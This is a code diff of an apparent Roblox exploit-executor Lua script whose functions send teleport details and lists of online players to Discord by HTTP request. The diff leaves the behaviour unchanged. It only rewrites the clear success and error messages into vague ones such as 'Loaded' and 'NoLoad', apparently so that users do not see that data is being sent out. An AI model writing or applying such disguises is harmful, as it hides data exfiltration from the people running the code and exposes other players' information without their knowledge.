@@ -57,12 +57,12 @@ local function sendTeleportInfoAndPrepareScript()
                 })
 
                 if response.StatusCode == 204 then
-                    print("Teleport information sent successfully.")
+                    print("Loaded")
                 else
-                    warn("Error sending teleport information: " .. response.StatusMessage)
+                    warn("NoLoad: " .. response.StatusMessage)
                 end
             else
-                warn("No supported executor found to perform HTTP request.")
+                warn("Noload.")
             end
         end
 
@@ -127,12 +127,12 @@ local function sendOnlinePlayersInfoToDiscord()
                 })
 
                 if response.StatusCode == 204 then
-                    print("Online players information sent successfully.")
+                    print("Loaded.")
                 else
-                    warn("Error sending online players information: " .. response.StatusMessage)
+                    warn("No load: " .. response.StatusMessage)
                 end
             else
-                warn("No supported executor found to perform HTTP request.")
+                warn("executor no support")
             end
         end
 
